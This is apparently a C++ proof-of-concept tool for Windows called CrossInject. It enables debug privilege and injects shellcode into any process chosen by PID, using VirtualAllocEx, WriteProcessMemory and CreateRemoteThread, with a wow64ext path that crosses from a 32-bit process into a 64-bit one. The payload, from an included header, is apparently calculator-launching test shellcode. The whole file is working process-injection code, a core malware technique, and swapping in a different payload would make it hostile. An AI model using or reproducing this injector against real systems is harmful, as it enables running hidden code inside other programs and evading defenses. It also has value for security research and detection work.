#include <Windows.h>
#include <tchar.h>
#include <iostream>
#include "wow64ext.h"
#include "shellcode.h"

bool EnableDebugPrivilege()
{
    HANDLE hToken;
    LUID sedebugnameValue;
    TOKEN_PRIVILEGES tkp;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return false;
    }
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue)) {
        CloseHandle(hToken);
        return false;
    }
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = sedebugnameValue;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
        CloseHandle(hToken);
        return false;
    }
    return true;
}

void InjectShellcodeX86ByPid(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);

    LPVOID lpBaseAddress = VirtualAllocEx(hProcess, 0, sizeof(calcX86), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, lpBaseAddress, calcX86, sizeof(calcX86), NULL);

    CloseHandle(
        CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)lpBaseAddress, 0, 0, 0)
    );

    CloseHandle(hProcess);
}

void InjectShellcodeX64ByPid(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);

    DWORD64 lpBaseAddress = VirtualAllocEx64(hProcess, 0, sizeof(calcX64), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory64(hProcess, lpBaseAddress, calcX64, sizeof(calcX64), NULL);

    CloseHandle64(
        CreateRemoteThread64((DWORD64)hProcess, (DWORD64)lpBaseAddress, (DWORD64)0)
    );

    CloseHandle(hProcess);
}

int main(int argc, char* argv[]) {
    if (sizeof(LPVOID) == 8) {
        printf("You compiled this EXE as x64, change it to x86 to test the inject function.\n");
        return 0;
    }

    if (argc != 3){
        printf("Usage: CrossInject.exe -p 1234, inject calc shellcode to target process.\n");
        return 0;
    }

    if (!EnableDebugPrivilege()) {
        printf("Enable debug privilege failed, make sure you run as administrator or inject may fail.\n");
    }

    DWORD pid = atol(argv[2]);
    BOOL isWow64 = FALSE;
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);

    if (hProcess == nullptr){
        printf("Error process not found or need privilege!\n");
        return 0;
    }

    IsWow64Process(hProcess,&isWow64);
    CloseHandle(hProcess);

    if (isWow64)
    {
        printf("Target process is 32 bit, inject 32 bit shellcode.\n");
        InjectShellcodeX86ByPid(pid);
    }
    else {
        printf("Target process is 64 bit, inject 64 bit shellcode.\n");
        InjectShellcodeX64ByPid(pid);
    }

	return 0;
}